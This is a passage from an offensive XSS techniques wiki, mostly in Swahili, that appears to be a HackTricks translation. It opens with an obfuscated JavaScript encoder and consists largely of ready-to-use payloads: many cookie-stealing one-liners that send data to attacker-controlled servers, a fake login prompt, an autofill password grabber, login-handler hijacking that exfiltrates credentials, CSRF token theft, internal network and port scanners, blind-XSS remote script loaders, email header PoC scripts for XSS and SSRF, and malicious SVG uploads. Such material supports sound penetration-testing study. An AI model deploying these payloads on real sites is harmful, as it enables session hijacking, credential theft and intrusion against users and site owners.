ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS payloads za kawaida

### Payloads kadhaa ndani ya 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Fanya mtumiaji avinjari ukurasa bila kutoka kwenye iframe na kunasa vitendo vyake (ikiwa ni pamoja na taarifa zilizotumwa kwenye fomu):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Pata Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Hautaweza kufikia cookies kutoka JavaScript** ikiwa bendera ya HTTPOnly imewekwa kwenye cookie. Lakini hapa kuna [njia kadhaa za kupita ulinzi huu](../hacking-with-cookies/index.html#httponly) ikiwa una bahati.

### Kuiba Maudhui ya Ukurasa
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Pata IP za ndani
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Short times indicate a responding port_ _Longer times indicate no response._

Kagua orodha ya ports zilizozuiwa katika Chrome [**hapa**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) na katika Firefox [**hapa**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Sanduku la kuomba maelezo ya kuingia
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Kukamata Auto-fill passwords
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Wakati data yoyote inapowasilishwa katika shamba la password, username na password hutumwa kwenye attackers server; hata kama client atachagua saved password na hata asiandike chochote, credentials zitatolewa (ex-filtrated).

### Hijack form handlers to exfiltrate credentials (const shadowing)

Ikiwa handler muhimu (kwa mfano, `function DoLogin(){...}`) imetangazwa baadaye kwenye ukurasa, na payload yako inafanya kazi mapema (kwa mfano, kupitia inline JS-in-JS sink), ainisha `const` yenye jina lile kwanza ili kuzuia na kufunga handler. Matangazo ya function ya baadaye hayawezi kubadilisha upya jina la `const`, na hivyo kuiacha hook yako ikidhibiti:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Vidokezo
- Hii inategemea mpangilio wa utekelezaji: injection yako lazima itekelezwe kabla ya legitimate declaration.
- Ikiwa payload yako imefungwa ndani ya `eval(...)`, bindings za `const/let` hazitatokea kuwa globals. Tumia dynamic `<script>` injection technique kutoka sehemu “Deliverable payloads with eval(atob()) and scope nuances” kuhakikisha true global, non-rebindable binding.
- Endapo keyword filters zitalizuia code, changanya na Unicode-escaped identifiers au `eval(atob('...'))` delivery, kama ilivyoonyeshwa hapo juu.

### Keylogger

Nilipotafuta tu kwenye github nilikuta kadhaa tofauti:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Unaweza pia kutumia metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Kuiba majumbe ya PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Kutumia Vibaya Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Kufikia Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Unaweza pia kutumia: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Fikia Maudhui Yaliyofichwa

Kutoka kwa [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) inawezekana kujifunza kwamba hata ikiwa baadhi ya thamani zinafifia kutoka JS, bado inawezekana kuzipata katika atributi za JS katika objects tofauti. Kwa mfano, ingizo la REGEX bado linaweza kuonekana hata baada ya thamani ya ingizo la regex kuondolewa:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Kutumia udhaifu mengine

### XSS in Markdown

Je, unaweza kuingiza Markdown code ambayo itatafsiriwa? Labda unaweza kupata XSS! Angalia:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Umepata XSS kwenye **tovuti inayotumia caching**? Jaribu **kuibadilisha hadi SSRF** kupitia Edge Side Include Injection kwa payload hii:
```python
<esi:include src="http://yoursite.com/capture" />
```
Tumia ili kuzipitisha vikwazo vya cookie, vichujio vya XSS na mengi zaidi!\
Taarifa zaidi kuhusu mbinu hii hapa: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS katika PDF zinazotengenezwa kwa dynamic

Iwapo ukurasa wa wavuti unaunda PDF kwa kutumia input inayodhibitiwa na mtumiaji, unaweza kujaribu **kudanganya bot** inayounda PDF ili **ikutekeleze JS code yoyote**.\
Hivyo, ikiwa **bot ya kuunda PDF inapata** aina fulani za **HTML** **tags**, itazitafsiri, na unaweza **kutumia vibaya** tabia hii kusababisha **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Kama huwezi kuingiza HTML tags inaweza kuwa vyema kujaribu **kuingiza PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, iliyolenga kuharakisha utendaji wa ukurasa wa wavuti kwenye vifaa vya rununu, inajumuisha HTML tags zilizoambatanishwa na JavaScript kuhakikisha utendakazi huku ikiweka msisitizo juu ya kasi na usalama. Inasaidia seti mbalimbali za components kwa vipengele tofauti, zinazopatikana kupitia [AMP components](https://amp.dev/documentation/components/?format=websites).

Muundo wa [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) unaongeza components maalum za AMP kwa barua pepe, ukiruhusu wapokeaji kuingiliana na maudhui moja kwa moja ndani ya barua pepe zao.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

RFC 2369 `List-Unsubscribe` header inaweka URIs zinazoendeshwa na mshambuliaji ambazo webmail nyingi na mail clients hugeuza moja kwa moja kuwa vifungo vya "Unsubscribe". Wakati URI hizo zinapoonyeshwa au kupakiwa bila uthibitisho, header inakuwa sehemu ya injection kwa ajili ya stored XSS (kama link ya unsubscribe imewekwa kwenye DOM) na SSRF (kama server inafanya ombi la unsubscribe kwa niaba ya mtumiaji).

#### Stored XSS via `javascript:` URIs

1. **Tuma barua pepe kwako mwenyewe** ambapo header inaelekeza kwa `javascript:` URI huku sehemu nyingine za ujumbe zikibaki benign ili vichujio vya spam visivitambue.
2. **Hakikisha UI inaonyesha thamani** (wateja wengi wanaonyesha katika dirisha la "List Info") na angalia kama tag `<a>` iliyotokana inapata sifa zinazosimamiwa na mshambuliaji kama `href` au `target`.
3. **Chochea utekelezaji** (mfano, CTRL+click, middle-click, au "open in new tab") wakati link inatumia `target="_blank"`; vivinjari vitatafsiri JavaScript iliyotolewa katika origin ya programu ya webmail.
4. Angalia primitive ya stored-XSS: payload inabaki pamoja na barua pepe na inahitaji tu click ili itekelezwe.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Baiti ya newline (`%0a`) katika URI inaonyesha kwamba hata tabia zisizo za kawaida hupitia pipeline ya rendering katika clients zenye udhaifu kama Horde IMP H5, zinazoweza kuonyesha string hiyo kama ilivyo ndani ya tagi ya anchor.

<details>
<summary>Minimal SMTP PoC inayotuma header ya List-Unsubscribe hatari</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Wakala za kuondoa usajili upande wa server -> SSRF

Baadhi ya wateja, kama vile Nextcloud Mail app, hutumia proxy kwa kitendo cha kuondoa usajili kwa upande wa server: kubofya kitufe huamuru server ifanye request kwa URL iliyotolewa yenyewe. Hii inageuza header kuwa primitive ya SSRF, hasa wakati wasimamizi wameseti `'allow_local_remote_servers' => true` (imeandikwa katika [HackerOne report 2902856](https://hackerone.com/reports/2902856)), ambayo inaruhusu maombi kuelekea loopback na RFC1918 ranges.

1. **Tengeneza barua pepe** ambapo `List-Unsubscribe` inalenga endpoint inayodhibitiwa na mshambuliaji (kwa blind SSRF tumia Burp Collaborator / OAST).
2. **Weka `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** ili UI ionyeshe kitufe cha kuondoa usajili kwa bonyeza moja.
3. **Kamilisha mahitaji ya uaminifu**: Nextcloud, kwa mfano, hufanya tu maombi ya HTTPS ya kuondoa usajili wakati ujumbe unapopita DKIM, hivyo mshambuliaji lazima asaini barua pepe kwa kutumia domain wanayodhibiti.
4. **Sambaza ujumbe kwa kisanduku cha barua kinachoshughulikiwa na server ya lengo** na subiri hadi mtumiaji abofye kitufe cha kuondoa usajili.
5. **Tazama callback upande wa server** kwenye collaborator endpoint, kisha pivot kuelekea anwani za ndani mara tu primitive imethibitishwa.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>Ujumbe wa List-Unsubscribe uliotiwa saini na DKIM kwa SSRF testing</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Vidokezo vya majaribio**

- Tumia endpoint ya OAST kukusanya hits za blind SSRF, kisha rekebisha URL ya `List-Unsubscribe` ili kulenga `http://127.0.0.1:PORT`, metadata services, au host nyingine za ndani mara primitive itakapothibitishwa.
- Kwa sababu unsubscribe helper mara nyingi inatumia tena HTTP stack sawa na application, unamrithi proxy settings zake, HTTP verbs, na header rewrites, na hivyo kuwezesha tricks za traversal zilizofafanuliwa katika [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS kupakia faili (svg)

Pakia kama picha faili kama ile ifuatayo (kutoka [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Pata **payloads za SVG zaidi katika** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Mbinu Mbalimbali za JS & Taarifa Muhimu


{{#ref}}
other-js-tricks.md
{{#endref}}

## Rasilimali za XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Marejeo

